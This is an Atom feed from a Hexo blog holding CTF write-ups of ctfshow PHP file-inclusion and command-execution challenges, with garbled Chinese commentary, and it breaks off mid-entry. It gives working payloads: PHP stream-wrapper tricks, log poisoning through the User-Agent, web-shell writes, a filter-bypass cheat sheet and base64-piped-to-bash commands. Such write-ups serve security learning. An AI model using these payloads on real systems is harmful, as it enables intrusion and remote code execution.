<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-04T07:26:46.954Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>filecontains</title>
    <link href="http://yoursite.com/2020/09/24/filecontains/"/>
    <id>http://yoursite.com/2020/09/24/filecontains/</id>
    <published>2020-09-24T12:19:35.000Z</published>
    <updated>2020-10-04T07:26:46.954Z</updated>
    
    <content type="html"><![CDATA[<h3 id="filecontain"><a href="#filecontain" class="headerlink" title="filecontain"></a>filecontain<a id="more"></a></h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åŒ…å«ï¼Œæ²¡æœ‰ç»™å‡ºå›æ˜¾</p><p>å°è¯•ä¼ªåè®®åŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ¹é…åˆ°phpå°±ä¼šè¢«æ›¿æ¢ï¼Œè¿™é‡Œå¯ä»¥ç”¨dataåè®®å†™å…¥å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">(attention:åŠ å¯†æœ€å¥½ç”¨æœ¬åœ°å·¥å…·ï¼Œç½‘ä¸ŠåŠ å¯†æœ‰åŒºåˆ«)</span><br></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dataåè®®ä¹Ÿä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œæƒ³åˆ°å¯èƒ½å¯ä»¥é€šè¿‡å†™å…¥æ—¥å¿—æ–‡ä»¶è¿›è¡ŒåŒ…å«æ¥<code>getshell</code>ï¼ŒburpæŠ“åŒ…ä¿®æ”¹UA</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">UA:<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span><span class="comment">//<span class="meta">&lt;?php</span> system('cat fl0g.php');<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/1.png" class=""><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ä¸ªå†’å·ï¼Œä¸Šé¢˜æ–¹æ³•æ‰“é€š</p><h3 id="web82-web86"><a href="#web82-web86" class="headerlink" title="web82-web86"></a>web82-web86</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">"&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?&gt;"</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„çŸ¥è¯†ç‚¹ï¼Œ<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code>ï¼Œå¾ˆè¯¦ç»†</p><p>ä½¿ç”¨base64è¿›è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=xxx.php</span></span><br><span class="line">POST: content=aaPD9waHAgIGV2YWwoJF9QT1NUWzFdKTs%<span class="number">2</span>FPg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">è¿›è¡ŒurlåŒç¼–ç </span><br><span class="line">é€šè¿‡base64è¿‡æ»¤ä¹‹åå°±åªæœ‰(phpdie)<span class="number">6</span>ä¸ªå­—ç¬¦æˆ‘ä»¬å°±è¦æ·»åŠ <span class="number">2</span>ä¸ªå­—ç¬¦è®©å‰é¢çš„å¯ä»¥è¿›è¡Œç¼–ç ï¼Œbases64ï¼Œ<span class="number">4</span>ä¸ªå­—ç¬¦ä¸€ç»„</span><br></pre></td></tr></table></figure><img src="/2020/09/24/filecontains/2.png" class=""><p>ä¹‹åå†è®¿é—®å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œå³å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><img src="/2020/09/24/filecontains/3.png" class=""><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure><p>ä½œäº†å¾ˆå¤šçš„è¿‡æ»¤ï¼Œä½†æ˜¯å†’å·è¢«æ”¾å‡ºæ¥äº†ï¼Œä¾æ—§å¯ä»¥ç”¨dataåè®®ï¼Œè¿™é‡Œæ³¨æ„åˆ°ç­‰å·è¢«è¿‡æ»¤äº†ï¼ŒåŠ å¯†ä¹‹åçš„å†…å®¹èµ‹å€¼æ—¶å»æ‰ç­‰å·å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs</span></span><br></pre></td></tr></table></figure><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>å¼€é¢˜æ˜¯ä¸ªè§†é¢‘ï¼Œä¸‹è½½ï¼Œforemostæ‹¿åˆ°ä¸€å¼ æºç å›¾ç‰‡</p><img src="/2020/09/24/filecontains/4.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å…¶ä»–çš„è¿‡æ»¤å™¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span></span><br><span class="line">postï¼šcontents=?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?</span><br><span class="line">    </span><br><span class="line">å†è®¿é—®<span class="number">1.</span>phpï¼Œåˆ©ç”¨shell</span><br><span class="line">Qftm=system(<span class="string">'cat flag.php'</span>);</span><br><span class="line"></span><br><span class="line">é™„ä¸Šæ–‡ç« ï¼šhttps:<span class="comment">//www.anquanke.com/post/id/202510#h3-15</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;filecontain&quot;&gt;&lt;a href=&quot;#filecontain&quot; class=&quot;headerlink&quot; title=&quot;filecontain&quot;&gt;&lt;/a&gt;filecontain
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>ctfshowcommand</title>
    <link href="http://yoursite.com/2020/09/22/ctfshowcommand/"/>
    <id>http://yoursite.com/2020/09/22/ctfshowcommand/</id>
    <published>2020-09-22T10:37:30.000Z</published>
    <updated>2020-09-24T11:53:53.203Z</updated>
    
    <content type="html"><![CDATA[<h3 id="commandç»•è¿‡"><a href="#commandç»•è¿‡" class="headerlink" title="commandç»•è¿‡"></a>commandç»•è¿‡<a id="more"></a></h3><h4 id="çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢"><a href="#çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢" class="headerlink" title="çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢"></a>çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">åˆ†éš”å‘½ä»¤</span><br><span class="line">;<span class="comment">//åˆ†å·åº”è¯¥æ˜¯æœ€å¥½ç†è§£çš„</span></span><br><span class="line">|<span class="comment">//åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤</span></span><br><span class="line">||<span class="comment">//åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤</span></span><br><span class="line">&amp;<span class="comment">//ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è‡ªå·±å§¿åŠ¿ä¸å¯¹ï¼Œæ²¡æˆåŠŸï¼Œä¸‹é¢ä¹Ÿæ˜¯ä¸€æ ·</span></span><br><span class="line">&amp;&amp;<span class="comment">//ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">ç©ºæ ¼ç»•è¿‡</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;<span class="comment">//éœ€è¦å†™çš„æƒé™</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line">%<span class="number">3</span>c</span><br><span class="line">A=$<span class="string">'cat\x20flag'</span>&amp;&amp;$A</span><br><span class="line">A=$<span class="string">'cat\x09flag'</span>&amp;&amp;$A</span><br><span class="line">é»‘åå•</span><br><span class="line"><span class="comment">//ä¸€èˆ¬æƒ…å†µåƒflagã€phpè¿™ç§å­—ç¬¦ä¼šè¢«banæ‰ï¼Œè¿™æ—¶å€™å°±éœ€è¦è¿›è¡Œç»•è¿‡äº†</span></span><br><span class="line">é€šé…ç¬¦</span><br><span class="line">*<span class="comment">//åŒ¹é…ä»»ä½•æ–‡æœ¬æˆ–å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªé€šè¿‡æµ‹è¯•å‘ç°å¹¶ä¸èƒ½ä¸IFSæˆ–&lt;è¿™ä¸¤ä¸ªå­—ç¬¦ä¸€èµ·ä½¿ç”¨</span></span><br><span class="line">?<span class="comment">//åŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">ç©ºå­—ç¬¦</span><br><span class="line">$@<span class="comment">//ca$@t flag</span></span><br><span class="line">$<span class="number">1</span>-$<span class="number">9</span><span class="comment">//ca$1t flag</span></span><br><span class="line">$&#123;æ•°å­—&#125;  <span class="comment">//ca$&#123;1&#125;t flag</span></span><br><span class="line"> </span><br><span class="line">ç¼–ç ç»•è¿‡</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Y2F0IGZsYWcucGhwCg=="</span>|base64 -d|bash<span class="comment">//è§£ç ä¸ºcat flag.phpå¹¶æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cat flag.php"</span>|base64<span class="comment">//æœ€å¥½åˆ«åœ¨åœ¨çº¿ç½‘ç«™ç¼–ç ï¼Œä¸ç„¶å¯èƒ½ä¼šå°†ç©ºæ ¼è½¬æˆurlç¼–ç ï¼Œä»è€Œæ— æ³•æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"> </span><br><span class="line">å˜é‡æ›¿æ¢</span><br><span class="line">a=t;b=g;ca$a fla$b.php</span><br><span class="line"> </span><br><span class="line">å¼•å·</span><br><span class="line">ca<span class="string">''</span>t fl<span class="string">''</span>ag.php</span><br><span class="line"></span><br><span class="line">åæ–œæ†</span><br><span class="line"></span><br><span class="line">ca\t f\la\g.php</span><br><span class="line">LinuxæŸ¥çœ‹æ–‡ä»¶å‘½ä»¤</span><br><span class="line">cat<span class="comment">//cat flag.php</span></span><br><span class="line">tac<span class="comment">//tac flag.php</span></span><br><span class="line">head<span class="comment">//head flag.php</span></span><br><span class="line">tail<span class="comment">//tail flag.php</span></span><br><span class="line">nl<span class="comment">//nl flag.php</span></span><br><span class="line">more<span class="comment">//more flag.php</span></span><br><span class="line">less<span class="comment">//less flag.php</span></span><br><span class="line">od<span class="comment">//od flag.php</span></span><br><span class="line">grep<span class="comment">//grep 'fla' flag.php</span></span><br><span class="line">strings<span class="comment">//strings flag.php</span></span><br><span class="line">sort<span class="comment">//sort flag.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line">pos()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line">array_reverse()ï¼šæ•°ç»„é€†åº</span><br><span class="line">scandir()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">next()ï¼š å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•è¿‡æ»¤äº†flag,ç”¨é€šé…ç¬¦å³å¯ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=system(<span class="string">"ls"</span>);</span><br><span class="line">c=system(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„é¢˜ç›®éƒ½åªæ”¾æ ¸å¿ƒéƒ¨åˆ†</p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œè¿‡æ»¤äº†phpå’Œsystem,å½±å“ä¸å¤§ï¼Œsystemçš„æ›¿ä»£å‡½æ•°æœ‰å¾ˆå¤šï¼Œåƒæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">exec()</span><br><span class="line"><span class="comment">#è¿™é‡Œè¦æ³¨æ„é™¤äº†systeméƒ½æ˜¯ä¸ä¼šç»™å‡ºå›æ˜¾çš„ï¼Œè¦ç”¨è¯¸å¦‚echo,print_rç­‰æ¥å¸¦å‡ºç»“æœ</span></span><br></pre></td></tr></table></figure><p>ä¸æŸ¥çœ‹ç›®å½•ç»“æ„ç›´æ¥ç›²çŒœæ–‡ä»¶ä½ç½®ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'find / -name f*'</span>);</span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ–°åŠ äº†å‡ ä¸ªè¿‡æ»¤ï¼Œcat,sort,shell,ç©ºæ ¼ç­‰ï¼Œè¿˜æ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œä¸Šé¢çš„çŸ¥è¯†æ€»ç»“é‡Œæœ‰ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span>(`ls`);</span><br><span class="line">c=<span class="keyword">echo</span>(`c\at%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜è¿‡æ»¤çš„ä¸œè¥¿å˜å¤šäº†ï¼Œå•å¼•å·ï¼Œåˆ†å·ï¼Œæ‰“å°echoç­‰éƒ½è¢«è¿‡æ»¤äº†</p><p>è¿™é‡Œå¯ä»¥å°è¯•åŒ…å«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span><span class="string">"/etc/passwd"</span><span class="meta">?&gt;</span></span><br><span class="line">å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œè€ƒè™‘å†™å…¥å°ğŸ</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:<span class="number">1</span>=/etc/passwd</span><br><span class="line">æœ€åå¯ä»¥ç”¨ä¼ªåè®®</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web33-35-payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ"><a href="#web33-35-payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ" class="headerlink" title="web33-35(payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ)"></a>web33-35(payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ)</h3><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>å¤šè¿‡æ»¤äº†æ•°å­—ï¼Œpostä¼ é€’çš„å‚æ•°æ¢æˆå­—æ¯å³å¯</p><h3 id="web37-åŒ39"><a href="#web37-åŒ39" class="headerlink" title="web37(åŒ39)"></a>web37(åŒ39)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¢äº†å½¢å¼çš„ä»£ç ï¼Œè¿™é‡Œä¼šå¯¹è¾“å…¥è¿›è¡ŒåŒ…å«ï¼Œè¿™é‡Œç¬¬ä¸€ååº”å°±æ˜¯å†™å…¥å°é©¬ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ä¸€å¥è¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span></span><br><span class="line">ç›¸å½“äºæ‰§è¡Œäº†phpè¯­å¥<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span>.php</span><br><span class="line">å› ä¸ºå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.phpä¼šè¢«å½“æˆhtmlé¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td 